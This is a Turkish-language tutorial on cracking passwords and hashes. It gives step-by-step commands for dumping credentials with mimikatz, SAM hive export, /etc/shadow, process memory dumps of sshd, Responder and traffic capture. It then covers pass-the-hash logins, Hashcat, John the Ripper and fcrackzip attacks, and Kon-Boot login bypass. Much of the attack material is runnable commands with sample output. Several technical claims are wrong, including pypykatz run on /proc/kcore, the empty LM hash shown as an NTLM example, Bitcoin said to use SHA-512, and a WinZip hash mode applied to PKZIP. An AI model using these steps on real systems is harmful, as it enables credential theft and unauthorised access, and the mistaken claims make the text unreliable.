Parola veya hash kırma (password/hash cracking), bir parolanın veya şifrelenmiş halinin (hash) orijinal değerine geri döndürülmesi işlemidir. Genellikle siber güvenlik uzmanları, etik hackerlar ve penetrasyon test uzmanları tarafından güvenlik açıklarını test etmek için kullanılır.
Hash Nedir?
Hash, bir verinin tek yönlü olarak belirli bir algoritma ile şifrelenmiş halidir. MD5, SHA-1, SHA-256 gibi algoritmalar kullanılır. Hash fonksiyonları geri döndürülemez şekilde çalışır, yani orijinal parolaya doğrudan geri çevrilemezler. Ancak bazı yöntemlerle kırılabilirler.
Parola/Hash Kırma Yöntemleri
### 1. Brute Force (Kaba Kuvvet)
Tüm olası kombinasyonları tek tek deneyerek parolayı tahmin etmeye çalışır.
Zaman alıcıdır, ancak kısa ve zayıf parolalar için etkilidir.
### 2. Wordlist (Sözlük Saldırısı)
Önceden bilinen parola listelerini deneyerek hash’i çözmeye çalışır.
Kullanıcıların yaygın parolalar kullanma eğiliminden faydalanır.
### 3. Rainbow Table (Gökkuşağı Tablosu)
Hash-parola eşleşmelerini içeren önceden hesaplanmış tabloları kullanır.
Büyük veri tabanları gerektirir, ancak bazı hash türlerinde hızlı sonuç verir.
### 4. Hash Collision (Çakışma Saldırısı)
Hash fonksiyonlarının zayıflıklarından faydalanarak aynı hash değerine sahip farklı girdiler bulmaya çalışır.
MD5 ve SHA-1 gibi eski algoritmalar bu tür saldırılara karşı savunmasızdır.
### 5. Salting (Tuzlama) ve Peppering
Güvenli sistemlerde, parolalara rastgele bir "salt" (ek veri) eklenerek kırılmaları zorlaştırılır.
Salt’lı hash’leri kırmak için, salt değerinin bilinmesi gerekir.
Savunma Yöntemleri
Karmaşık ve uzun parolalar kullanmak (harf, rakam, özel karakter içeren)
İki faktörlü kimlik doğrulama (2FA) kullanmak
SHA-256 veya bcrypt gibi güçlü hash algoritmalarını tercih etmek
Parolaları hash’lerken salt kullanmak
Linux ve Windows işletim sistemleri, kullanıcı parolalarını saklamak için farklı hashleme yöntemleri kullanır. Her sistem, güvenliği artırmak için farklı algoritmalar ve teknikler uygular. İşte detaylar:

- Linux Hashleri
Linux, kullanıcı parolalarını /etc/shadow dosyasında hashlenmiş olarak saklar. Modern Linux sistemlerinde SHA-512, bcrypt ve yescrypt gibi güvenli algoritmalar kullanılır.
## Linux’ta Kullanılan Hashleme Algoritmaları
Hashler, $ işaretiyle başlayan özel bir formatta saklanır. Örneğin:
```bash
swift
```
$6$randomsalt$hashedpassword

Burada:
$1$ → MD5
$5$ → SHA-256
$6$ → SHA-512
$y$ → yescrypt (modern Linux dağıtımlarında varsayılan)
$2a$, $2b$, $2y$ → bcrypt
- Örnek bir SHA-512 hash’i
```bash
perl
```
$6$abc123$O7F3P... (uzun hash)
Buradaki abc123, hash’in kırılmasını zorlaştıran salt değeridir.
- Linux Hashlerini Görüntüleme
Root yetkisiyle aşağıdaki komutu kullanarak /etc/shadow dosyasındaki hashleri görüntüleyebilirsin:
```bash
bash
sudo cat /etc/shadow
```
Ancak, bu dosya normal kullanıcılar tarafından erişilemez.
- Linux Hash Kırma
John the Ripper veya Hashcat gibi araçlar, parola saldırılarında yaygın olarak kullanılır.

- Windows Hashleri
Windows, kullanıcı parolalarını Security Accounts Manager (SAM) veritabanında saklar. Bu dosya C:\Windows\System32\Config\SAM dizinindedir ve erişmek için Administrator yetkisi gerekir.
## Windows’ta Kullanılan Hashleme Algoritmaları
- LM Hash (Eski ve Güvensiz)
Eski Windows sistemlerinde kullanılmıştır (Windows XP ve öncesi).
Parolayı ikiye böler, küçük harfe duyarsızdır ve çok kolay kırılabilir.
Örnek LM Hash:
nginx
E52CAC67419A9A22
Kırmak için Rainbow Table saldırısı kullanılabilir.
- NTLM Hash (Modern Windows)
Windows NT, 2000, XP, Vista, 7, 8, 10, 11 tarafından kullanılır.
Parola MD4 ile hashlenir, ancak salt içermez.
NTLM, LM’ye göre daha güvenlidir, ancak brute-force saldırılarına karşı hâlâ kırılabilir.
- Windows Hashlerini Görüntüleme
Eğer yetkili erişimin varsa, Mimikatz veya samdump2 gibi araçlarla Windows hashlerini çıkarabilirsin.
Örnek:
```bash
powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
- Windows Hash Kırma
Windows hashlerini kırmak için Hashcat, John the Ripper veya Ophcrack (LM hash için) gibi araçlar kullanılır.

🛡️ Güvenlik Önlemleri
- Linux İçin:
SHA-512 veya bcrypt gibi güçlü algoritmalar kullanılmalı.
chage -M 90 user komutuyla belirli aralıklarla parola değişimi zorlanmalı.
- Windows İçin:
LM Hash devre dışı bırakılmalı.
NTLM yerine Kerberos kullanılmalı.
Hash’lerin çalınmasını önlemek için LSASS koruması ve Credential Guard etkinleştirilmeli.
_____________________________________________________________________________________
## SHA-512 Nedir?
SHA-512 (Secure Hash Algorithm 512), SHA-2 ailesine ait güçlü bir kriptografik hash fonksiyonudur.
512-bit uzunluğunda bir hash üretir (64 bayt).
Tek yönlüdür → Hash'ten orijinal veriye dönüş yapılamaz.
Çakışmaya dayanıklıdır → Aynı hash değerine sahip iki farklı girdi bulmak çok zordur.
Kriptografik olarak güvenlidir → MD5 ve SHA-1 gibi zayıf algoritmalara kıyasla daha güçlüdür.

- SHA-512 Hash Örneği
Örneğin, "ChatGPT" kelimesinin SHA-512 hash değeri şu şekilde olur:
C2DDA6F10302D4C8D15A6E228BE2D340...
Bu hash her zaman aynı girdiyi aynı hash'e dönüştürür, ancak küçük bir değişiklik bile hash değerini tamamen değiştirir (Avalanche etkisi).
🛠️ SHA-512 Hash’i Kendin Oluştur
Linux veya Windows'ta terminal kullanarak bir string'in SHA-512 hash’ini hesaplayabilirsin.
- Linux’ta:
```bash
bash
echo -n "ChatGPT" | sha512sum
```

- Windows’ta (PowerShell):
```bash
powershell
Get-FileHash -Algorithm SHA512 -InputStream (Get-Content -Path "test.txt" -AsByteStream)
```


- SHA-512 Nasıl Çalışır?
### 1. Ön İşleme (Padding)
Verinin uzunluğu 1024 bitin katı olacak şekilde doldurulur (padding).
Son 128 bit, orijinal verinin uzunluğunu temsil eder.
### 2. Bloklara Bölme
Veri, 1024-bitlik bloklara ayrılır.
### 3. Başlangıç Değerleri (Initial Hash Values)
SHA-512, işlem yaparken 8 tane 64-bit başlangıç değeri kullanır.
### 4. Çekirdek Döngü (Compression Function)
80 turdan oluşan bir işlem gerçekleştirilir.
Her turda farklı SHA-512 sabitleri (K) kullanılır.
Bit kaydırma, XOR ve ekleme işlemleri uygulanarak yeni değerler oluşturulur.
### 5. Son Hash Değeri
Tüm bloklar işlendiğinde, nihai 512-bit’lik hash değeri elde edilir.

- SHA-512’nin Gücü ve Kullanımı
- Neden Güvenli?
Çakışma direnci yüksektir → Farklı girdilerin aynı hash’i üretmesi imkansızdır.
Tersine çevrilemez → Hash'ten orijinal veriyi çıkarmak matematiksel olarak mümkün değildir.
Hızlıdır ve yaygın kullanılır.

- SHA-512 Nerelerde Kullanılır?
Parola saklama (Linux, macOS)
SSL/TLS sertifikaları
Blokzincir teknolojileri (Bitcoin)
Dosya doğrulama ve veri bütünlüğü kontrolleri
Windows işletim sistemleri, kullanıcı parolalarını Security Accounts Manager (SAM) veritabanında saklar. Bu parolalar LM (Lan Manager) ve NTLM (NT LAN Manager) hashleri şeklinde depolanır.
Windows hash sistemlerini detaylıca inceleyelim:

## Windows Hash Türleri
Windows, parolaları iki farklı formatta saklamıştır:
### 1. LM (Lan Manager) Hash → Çok eski ve zayıf (Windows XP ve öncesi)
### 1. LM Hash (Zayıf ve Güvensiz)
- Windows NT, 2000, XP ve daha eski sürümlerde kullanılmıştır.
🔹 Zayıf noktaları:
Parolaları büyük harfe çevirir (case-insensitive).
Parolayı ikiye böler (7 karakterlik iki parça).
Kısa ve basit parolalar için kırılması çok kolaydır.
Rainbow Table saldırılarıyla saniyeler içinde kırılabilir.
## LM Hash Hesaplama Adımları
Parola: Pass123 için LM Hash şu adımlarla hesaplanır:
Küçük harfler büyük harfe çevrilir → PASS123
7 karakterlik iki parçaya ayrılır: PASS123 + 0000000
Her parça DES (Data Encryption Standard) ile şifrelenir.
Sonuç olarak 16 baytlık bir LM Hash üretilir.
- Örnek LM Hash:
```bash
nginx
```
E52CAC67419A9A22C8B865E6F78C6B58
- LM Hash’i Görüntüleme:
Administrator yetkisiyle Mimikatz, Hashcat veya samdump2 gibi araçlarla LM Hash’leri çıkarabilirsin.


### 2. NTLM Hash (Günümüzde Kullanılan Sistem)
Windows XP ve sonrasında LM Hash devre dışı bırakıldı ve NTLM Hash sistemi kullanılmaya başlandı.
- Özellikleri:
MD4 (Message Digest Algorithm 4) kullanır.
Salt içermez, bu yüzden Rainbow Table saldırılarına açıktır.
Büyük/küçük harf duyarlıdır (LM Hash’ten farkı).
Günümüzde hâlâ Windows sistemlerinde bulunur.
## NTLM Hash Hesaplama Adımları
Kullanıcının parolası Unicode formatına çevrilir.
Parola MD4 hash fonksiyonuyla hashlenir.
Sonuç: 32 bayt uzunluğunda bir NTLM Hash üretilir.
- Örnek NTLM Hash:
```bash
nginx
```
AAD3B435B51404EEAAD3B435B51404EE
## NTLM Hash’in Güvenlik Sorunları
🔸 Salt içermediği için hashler Rainbow Table saldırılarıyla kırılabilir.
🔸 Pass-the-Hash (PTH) saldırılarına açıktır (Kimlik doğrulama için parolanın kendisi yerine doğrudan hash kullanılır).
- NTLM Hash’i Görüntüleme:
Yetkili erişimin varsa, Mimikatz, Hashcat, samdump2 veya fgdump ile NTLM Hash’i çekebilirsin:
```bash
powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

- NTLMv2 (Gelişmiş NTLM)
Windows’un güvenliği artırmak için getirdiği yeni hashleme sistemi. NTLMv1 yerine kullanılmalıdır.
HMAC-MD5 kullanır (daha güvenli).
Sunucu kimliğini doğrular (MITM saldırılarını azaltır).
Zayıf parolalara karşı hala savunmasızdır.
## NTLMv2 Örnek Hash Formatı
```bash
cpp
```
USER::DOMAIN:11223344556677889900AABBCCDDEEFF:11223344556677889900AABBCCDDEEFF::11223344556677889900

Burada HMAC-MD5 ile şifrelenmiş bir hash bulunur.

## Windows Hash'leri Nerede Saklanır?
Windows, hashleri SAM (Security Accounts Manager) dosyasında saklar:
```bash
arduino
```
C:\Windows\System32\config\SAM
## Bu dosya doğrudan okunamaz. Yetkili erişim gereklidir.

## Windows Hashlerini Kırma Yöntemleri
Windows hashlerini kırmak için yaygın kullanılan araçlar şunlardır:
- LM Hash Kırma
Ophcrack (Rainbow Table ile kırma)
John the Ripper
Hashcat
- NTLM Hash Kırma
Hashcat → GPU ile hızlı brute-force
John the Ripper → Wordlist saldırısı
Mimikatz → Pass-the-Hash saldırısı
## Örnek Hashcat Komutu (NTLM Kırma)
```bash
bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
-m 1000 → NTLM Hash Modu
-a 0 → Wordlist saldırısı
```
rockyou.txt → Popüler parola listesi

🛡️ Windows Hash Güvenliği İçin Önlemler
- LM Hash tamamen kapatılmalı
```bash
reg
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\NoLMHash = 1
- NTLM yerine Kerberos kullanılmalı
NTLM eski protokol olduğundan Active Directory Kerberos kullanmalı.
- Hash'leri depolamak yerine, multi-factor authentication (MFA) ve biyometrik doğrulama kullanılmalı.
- Windows’ta Credential Guard ve LSA Protection etkinleştirilmeli.

🎯 Özet
_______________________________________________________________________________________
Linux sistemlerinde parola hashleri genellikle /etc/shadow dosyasında saklanır. Root yetkisine sahipsen, hashleri bu dosyadan alabilir veya sistemde çalışan işlemlerden çıkarabilirsin.

## 1. Linux Hash'leri Nerede Saklanır?
Linux sistemlerinde kullanıcı bilgileri iki temel dosyada bulunur:
- /etc/passwd → Kullanıcı adları ve sistem bilgileri saklanır.
🔹 /etc/shadow → Parola hashleri burada tutulur.


Örnek passwd dosya içeriği:
```bash
ruby
```
root:x:0:0:root:/root:/bin/bash
user:x:1001:1001:Test User:/home/user:/bin/bash
Buradaki x, parolanın /etc/shadow dosyasında saklandığını gösterir.
Örnek /etc/shadow dosya içeriği:
```bash
swift
```
root:$6$hGf7K8cD$FZ.Dz08vCVPz3j.lObyHMQ8WXtfHqQ3gBGx0.:19000:0:99999:7:::
user:$6$abcdefg$h1q1j2l3k4m5n6p7.:19000:0:99999:7:::
Buradaki root:$6$hGf7K8cD$... kısmı hashlenmiş paroladır.

## 2. Linux Hashlerini Toplama Yöntemleri
- a) /etc/shadow Dosyasını Okuma
Root yetkisine sahipsen, hashleri şu komutla alabilirsin:
```bash
bash
cat /etc/shadow
```
- Çıktı Örneği:
```bash
swift
```
root:$6$abcdefgh$xyzxyzxyzxyzxyzxyz:19000:0:99999:7:::
Buradaki parça şu şekilde ayrılır:
$6$ → Kullanılan hash algoritması (SHA-512)
abcdefgh → Salt (rastgele eklenen değer)
xyzxyzxyzxyzxyzxyz → Asıl hash değeri





- Hangi hash algoritması kullanılıyor?
Eğer root yetkin yoksa, hashleri başka yollarla çekmen gerekir.

- b) unshadow ile /etc/passwd ve /etc/shadow Birleştirme
John the Ripper gibi araçlar için /etc/passwd ve /etc/shadow dosyalarını birleştirmek gerekebilir.
```bash
bash
unshadow /etc/passwd /etc/shadow > hashlist.txt
```
Bu komut kullanıcı adı ve hashleri tek bir dosyada birleştirir.
- Çıktı Örneği:
```bash
swift
```
root:$6$abcdefgh$xyzxyzxyzxyzxyzxyz:19000:0:99999:7:::
user:$6$abcdefg$h1q1j2l3k4m5n6p7.:19000:0:99999:7:::

## 3. Hashleri RAM Üzerinden Çekme
Bazı durumlarda, RAM üzerinde çalışan işlemlerden hashleri çıkarabilirsin.
- a) mimikatz Alternatifi: pypykatz ile Linux Hash Çekme
Linux için Mimikatz alternatifi olan pypykatz ile RAM’den hash çekebilirsin.
```bash
bash
git clone https://github.com/skelsec/pypykatz.git
```
cd pypykatz
```bash
python3 pypykatz lsa minidump /proc/kcore
```
- Çıktı:
```bash
makefile
```
user:plaintextpassword
root:somehashvalue
Bu yöntem /proc/kcore üzerinden RAM’i okur ve açık parolaları veya hashleri alır.

- b) gcore ile Process Dump Alıp Hash Çekme
Bir Linux kullanıcısı sistemde oturum açtıysa, hashlerini çalışan bir süreçten çekebilirsin.
### 1. SSH veya diğer süreçleri bul:
```bash
bash
ps aux | grep sshd
```
- Çıktı:
```bash
yaml
```
root  1234  0.0  0.1  123456 7890 ? Ss  10:00 0:00 /usr/sbin/sshd
### 2. Process dump al:
```bash
bash
gcore -o dumpfile 1234
```
### 3. Dumpe bak:
```bash
bash
strings dumpfile | grep -i password
```
- Çıktı:
```bash
nginx
```
somepassword
- Bu yöntemle açık parolalar yakalanabilir.

## 4. Linux Hashlerini Ağdan Çekme (MITM Saldırıları)
Eğer bir Linux sistemine fiziksel erişimin yoksa, ağ üzerinden hashleri almak için şu yöntemleri kullanabilirsin:
- a) Responder ile Hash Yakalama
Eğer ağda bir SMB isteği yakalarsan, NTLMv2 hashlerini alabilirsin.
```bash
bash
```
responder -I eth0
- Çıktı:
```bash
pgsql
```
NTLMv2 Hash Captured: admin::DOMAIN:11223344556677889900AABBCCDDEEFF
- b) tcpdump ile SSH Trafiğini Dinleme
```bash
bash
tcpdump -i eth0 port 22 -w ssh_traffic.pcap
```
Bu dosyayı Wireshark ile açarak hash veya parolaları çıkarabilirsin.

## 5. Linux Hashlerini Kullanarak Yetki Yükseltme
Eğer hashleri aldıysan, onları Pass-the-Hash (PTH) saldırısında kullanabilirsin.
- pth-smbclient ile Hash Kullanarak Kimlik Doğrulama
```bash
bash
pth-smbclient -U "admin%aad3b435b51404eeaad3b435b51404ee" //192.168.1.100/c$
```
Bu yöntem, parolayı kırmadan doğrudan hash kullanarak giriş yapmanı sağlar.


## Özet: Linux Hashleri Nasıl Toplanır?
________________________________________________________________________________________


## Hashcat Nedir?
Hashcat, hashleri kırmak için kullanılan hızlı ve güçlü bir parola kırma aracıdır. CPU ve GPU desteği sayesinde çok hızlı çalışır ve çeşitli saldırı türlerini destekler.
- Hashcat’in Özellikleri:
✔️ CPU ve GPU desteği (NVIDIA, AMD, Intel)
✔️ Farklı hash türlerini destekler (NTLM, MD5, SHA-256, bcrypt, vb.)
✔️ Brute-force, Wordlist, Mask Attack gibi farklı saldırı türleri
✔️ Windows, Linux ve macOS’ta çalışır


## Hashcat Kullanımı
- 1. Hashcat’i İndirme ve Kurulum
Linux İçin:
```bash
bash
sudo apt update
sudo apt install hashcat
```
Windows İçin:
Resmi Hashcat Sayfasından indirilip zip dosyası çıkarılır.

- 2. Desteklenen Hash Türlerini Görüntüleme
```bash
bash
hashcat --help
```
- Çıktıdan bazı popüler hash türleri:
Örneğin, Windows NTLM hashlerini kırmak için 1000 kodu kullanılır.



- 3. Hash Türünü Belirleme
Eğer elinde bir hash varsa, hangi algoritmayla oluşturulduğunu anlamak için hashid veya hash-identifier kullanılabilir:
```bash
bash
hashid -m "5f4dcc3b5aa765d61d8327deb882cf99"
```
- Çıktı:
```bash
nginx
```
MD5
- Alternatif olarak:
```bash
bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hash-identifier
```

- 4. Wordlist (Sözlük) Kullanarak Hash Kırma
```bash
bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
```
- Komut Açıklaması:
```bash
-m 1000 → NTLM hash türü
-a 0 → Wordlist saldırısı
```
hash.txt → İçinde hash bulunan dosya
rockyou.txt → Parola listesi
Eğer eşleşen bir parola bulunursa, aşağıdaki gibi görüntülenir:
```bash
makefile
```
aad3b435b51404eeaad3b435b51404ee:Password123
- RockYou Wordlist’i Kurma:
```bash
bash
```
gzip -d /usr/share/wordlists/rockyou.txt.gz




- 5. Brute-Force Saldırısı (Deneme Yanılma)
Belirli bir şifre formatına göre brute-force saldırısı yapmak için:
```bash
bash
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l
```
- Açıklamalar:
```bash
-a 3 → Mask Attack (Brute-force)
?l?l?l?l?l?l → 6 harfli küçük harfli parola denemesi
```
?d → Rakam
?u → Büyük harf
?s → Özel karakter
- Örnek: 6 karakterli, büyük harf içeren bir şifre için:
```bash
bash
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d
```
Örneğin "Ahello5" gibi şifreleri dener.

- 6. Hybrid Attack (Sözlük + Brute-Force)
```bash
bash
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d
```
Bu komut, rockyou.txt listesindeki kelimeleri + 3 rakamlı kombinasyonları dener.

## Hashcat Performansını Artırma
Eğer GPU desteği varsa, işlemi hızlandırmak için şu komutu kullanabilirsin:
```bash
bash
hashcat -m 1000 -a 0 -w 3 --force hash.txt rockyou.txt
```
- Açıklamalar:
-w 3 → Yüksek performans
--force → Zorla çalıştır (bazı sistemlerde hata verirse)
GPU kullanımı kontrol etmek için:
```bash
bash
hashcat -I
```

## Özet: Hashcat ile Parola Kırma Yöntemleri

## Linux Parolasını Kırma (Hashcat Kullanarak)
Linux parolaları genellikle /etc/shadow dosyasında SHA-512, SHA-256 veya MD5 hash formatında saklanır. Eğer bu hash’i ele geçirdiysen, Hashcat veya John the Ripper gibi araçlarla kırabilirsin.

### 1. Linux Parola Hash’ini Alma
- a) /etc/shadow Dosyasından Hash Almak
Eğer root yetkisine sahipsen, şu komutla hashleri görebilirsin:
```bash
bash
cat /etc/shadow
```
- Çıktı Örneği:
```bash
swift
```
user:$6$abcdefgh$xyzxyzxyzxyzxyzxyz:19000:0:99999:7:::
Buradaki $6$, SHA-512 hash türünü ifade eder.
$1$ → MD5
$5$ → SHA-256
$6$ → SHA-512
Hash’i bir dosyaya kaydet:
```bash
bash
echo '$6$abcdefgh$xyzxyzxyzxyzxyzxyz' > hash.txt
```

- b) RAM’den Hash Almak (pypykatz)
Eğer bir kullanıcının giriş yapmış olduğu bir sistemde isen ve root yetkin yoksa, RAM’den hashleri çıkarmak için pypykatz kullanılabilir.
```bash
bash
git clone https://github.com/skelsec/pypykatz.git
```
cd pypykatz
```bash
python3 pypykatz lsa minidump /proc/kcore
```
- Çıktı:
```bash
swift
```
user:$6$abcdefgh$xyzxyzxyzxyzxyzxyz


### 2. Hash Türünü Belirleme
Eğer hash türünü bilmiyorsan, hash-identifier kullanabilirsin:
```bash
bash
```
hash-identifier

- Hash Türü Tespiti:
```bash
swift
```
$6$abcdefgh$xyzxyzxyzxyzxyzxyz → SHA-512
Eğer Hashcat kullanacaksan, uygun hash türü kodlarını öğrenmek için:
```bash
bash
hashcat --help | grep -i sha
```
- SHA-512 için uygun kod → 1800

### 3. Hashcat ile Linux Parolasını Kırma
RockYou Wordlist ile Kırma:
```bash
bash
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- Komut Açıklaması:
```bash
-m 1800 → SHA-512 hash türü
-a 0 → Wordlist attack
```
hash.txt → Kırılacak hashlerin olduğu dosya
/usr/share/wordlists/rockyou.txt → Sözlük dosyası
- RockYou Wordlist’i yüklemek için:
```bash
bash
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
- Brute-Force Attack ile Kırma
Eğer parola kısa ise, brute-force yöntemi kullanılabilir:
```bash
bash
hashcat -m 1800 -a 3 hash.txt ?l?l?l?l?l?l?l
```
- Açıklamalar:
```bash
?l → Küçük harf
```
?u → Büyük harf
?d → Rakam
?s → Özel karakter
Örneğin 6 haneli bir parola için:
```bash
bash
hashcat -m 1800 -a 3 hash.txt ?d?d?d?d?d?d
```
Bu "123456" gibi tüm 6 haneli sayısal kombinasyonları dener.

### 4. John the Ripper ile Linux Parolasını Kırma
Alternatif olarak, John the Ripper da kullanılabilir:
```bash
bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
John kırılan parolayı şu şekilde gösterir:
```bash
makefile
```
xyzxyzxyzxyzxyzxyz:password123
Kırılan parolaları görüntülemek için:
```bash
bash
john --show hash.txt
```


## Özet: Linux Parolasını Kırma Yöntemleri
___________________________________________________________________________________

## Windows Parolasını Kırma (Hashcat ve Alternatif Yöntemler)
Windows parolaları NTLM hashleri olarak saklanır ve genellikle SAM (Security Account Manager) dosyasında bulunur. NTLM hashlerini ele geçirip kırarak Windows parolasını elde edebilirsin.

### 1. Windows Hashlerini Alma
- a) SAM Dosyasından NTLM Hashlerini Çekme
Eğer sistemde admin yetkin varsa, SAM dosyasından hash almak için Mimikatz veya Pwdump kullanılabilir.
Mimikatz Kullanarak:
Komut İstemini (CMD) Yönetici Olarak Aç
Şu komutları çalıştır:
```bash
powershell
mimikatz
```
privilege::debug
sekurlsa::logonpasswords
- Çıktı Örneği:
```bash
makefile
```
Username: test
NTLM: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
Burada ilk kısım LM hash, ikinci kısım NTLM hash’dir. NTLM hash bizim için önemli olan kısımdır.

- b) SAM Dosyasını Manuel Çıkarma
Eğer fiziksel erişimin varsa ve admin yetkin bulunuyorsa, hashleri SAM dosyasından alabilirsin.
```bash
powershell
reg save hklm\sam sam.save
reg save hklm\system system.save
```
Daha sonra samdump2 kullanarak hashleri çıkarabilirsin:
```bash
bash
```
samdump2 system.save sam.save
- Çıktı Örneği:
```bash
ruby
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
Burada NTLM hash’i (ikinci kısım) kırmak için Hashcat kullanacağız.

### 2. Hashcat ile Windows NTLM Hashlerini Kırma
- a) Wordlist Attack ile Kırma
Eğer popüler bir parola kullanıldıysa, wordlist saldırısı en hızlı yöntemdir:
```bash
bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- Komut Açıklaması:
```bash
-m 1000 → NTLM hash (Windows)
-a 0 → Wordlist attack
```
hash.txt → Kırılacak hashlerin olduğu dosya
rockyou.txt → Parola listesi
- RockYou Wordlist’i yüklemek için:
```bash
bash
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
Eğer parola bulunursa, aşağıdaki gibi görüntülenir:
```bash
makefile
```
5f4dcc3b5aa765d61d8327deb882cf99:password


- b) Brute-Force Attack ile Kırma
Eğer parola bilinmiyorsa ve wordlist yeterli değilse, brute-force saldırısı kullanılabilir.
Örneğin, 6 karakterli küçük harfli bir parola için:
```bash
bash
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l
```
- Açıklamalar:
```bash
?l → Küçük harf
```
?u → Büyük harf
?d → Rakam
?s → Özel karakter
Örneğin 8 karakterli ve büyük harf, küçük harf, rakam içeren parola için:
```bash
bash
hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?d?d?d?d
```
Bu "Pass1234" gibi kombinasyonları dener.
- Brute-force işlemi uzun sürebilir. GPU kullanarak hızlandırmak için:
```bash
bash
hashcat -m 1000 -a 3 --force --opencl-device-types 1,2 --optimized-kernel-enable hash.txt ?u?l?l?l?d?d?d?d
```


- c) Hybrid Attack (Sözlük + Brute-Force)
Eğer parola belirli bir kelimeye benziyorsa, kelime listesi + sayı kombinasyonu denenebilir.
```bash
bash
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d
```
- Örnek:
Wordlist: "password"
Brute-force: "password123"

### 3. Alternatif Yöntemler ile Windows Parolasını Kırma
- a) John the Ripper ile NTLM Hash Kırma
Alternatif olarak, John the Ripper kullanılabilir:
```bash
bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
John kırılan parolayı şu şekilde gösterir:
```bash
makefile
```
5f4dcc3b5aa765d61d8327deb882cf99:password123
Kırılan parolaları görüntülemek için:
```bash
bash
john --show hash.txt
```


- b) Windows Parolasını Sıfırlama (Ophcrack veya Kon-Boot)
Eğer hash kırmak yerine parolayı sıfırlamak istiyorsan, Ophcrack veya Kon-Boot gibi araçlar kullanılabilir.
- Ophcrack Kullanımı:
Ophcrack Live CD’yi indir ve USB’ye yazdır.
Bilgisayarı USB’den başlat.
Ophcrack hashleri otomatik olarak kırmaya çalışır.
- Kon-Boot Kullanımı:
Kon-Boot’u bir USB’ye yazdır.
Bilgisayarı USB’den başlat ve oturum aç.
Şifresiz giriş yaparak parolayı değiştirebilirsin.

## Özet: Windows Parolasını Kırma Yöntemleri













## ZIP Dosyası Şifrelerini Kırma (Linux & Windows)
Şifrelenmiş ZIP dosyalarını kırmak için farklı yöntemler kullanabiliriz. Bunlar arasında wordlist saldırısı, brute-force ve mask attack gibi yöntemler bulunur. İşte en etkili yollar:

### 1. ZIP Dosyası Şifreleme Türünü Belirleme
ZIP şifreleme iki ana türde olabilir:
✅ ZIP Legacy Encryption: Daha eski ve zayıf bir algoritma kullanır, hızlı kırılabilir.
✅ AES-256 Encryption: Daha güçlüdür, brute-force saldırıları uzun sürebilir.
Şifreleme türünü belirlemek için zipinfo kullanabiliriz:
```bash
bash
zipinfo -v dosya.zip | grep "Encryption"
```
- Çıktı Örneği:
```bash
makefile
```
Encryption: Traditional PKWARE encryption
Bu, ZIP Legacy Encryption kullanıldığını gösterir ve hızlı bir şekilde kırılabilir.

### 2. fcrackzip ile ZIP Şifresi Kırma (Linux)
fcrackzip, Linux’ta ZIP dosyalarının şifresini kırmak için kullanılır.
- a) Wordlist Saldırısı ile ZIP Kırma
Eğer şifre tahmin edilebilir bir kelimeyse, wordlist saldırısı en hızlı yöntemdir.
```bash
bash
```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt dosya.zip
- Komut Açıklaması:
-u → ZIP dosyasının test edilmesini sağlar.
-D → Wordlist saldırısını etkinleştirir.
-p → Kullanılacak wordlist dosyasını belirtir.
dosya.zip → Şifreli ZIP dosyanın adı.
Eğer şifre rockyou.txt içinde varsa, anında çözülecektir.

- b) Brute-Force Saldırısı ile ZIP Kırma
Eğer parola bilinmiyorsa, brute-force yöntemi kullanılabilir:
```bash
bash
```
fcrackzip -u -c a -l 4-8 -v dosya.zip
- Komut Açıklaması:
-c a → Tüm harfleri ve sayıları dener.
-l 4-8 → 4 ile 8 karakter arasındaki parolaları dener.
-v → Ayrıntılı çıktı verir.
Eğer parola sadece sayılardan oluşuyorsa, şu komutla daha hızlı kırabilirsin:
```bash
bash
```
fcrackzip -u -c 1 -l 4-6 dosya.zip
Bu "1234", "56789" gibi sayısal parolaları dener.

### 3. John the Ripper ile ZIP Şifresi Kırma
Eğer fcrackzip yeterince hızlı değilse, John the Ripper kullanılabilir.
- a) ZIP Hash’i Çıkarma
Önce zip2john ile ZIP hash’ini çıkaralım:
```bash
bash
zip2john dosya.zip > hash.txt
```
- Çıktı Örneği:
```bash
markdown
```
dosya.zip:$pkzip$1*1*2*0*...
Ardından John the Ripper ile kırabiliriz:
```bash
bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Şifre kırıldığında şunu göreceksin:
```bash
python
```
password123 (dosya.zip)
Kırılan şifreyi görmek için:
```bash
bash
john --show hash.txt
```


### 4. Hashcat ile ZIP Şifresi Kırma (Daha Güçlü Saldırı)
Eğer parola uzun ve karmaşıksa, Hashcat kullanılabilir.
Öncelikle, zip2john kullanarak ZIP hash’ini çıkaralım:
```bash
bash
zip2john dosya.zip > hash.txt
```
Ardından Hashcat ile brute-force saldırısı başlatalım:
```bash
bash
hashcat -m 13600 -a 3 hash.txt ?l?l?l?l?l?l?l?l
```
- Komut Açıklaması:
```bash
-m 13600 → ZIP hash tipi
-a 3 → Brute-force saldırısı
?l → Küçük harfleri dener (?u büyük harf, ?d rakam, ?s özel karakter)
```
Örneğin, rakam ve harflerden oluşan 6 karakterli bir parola için:
```bash
bash
hashcat -m 13600 -a 3 hash.txt ?u?l?l?d?d?d
```


## Özet: ZIP Şifresi Kırma Yöntemleri
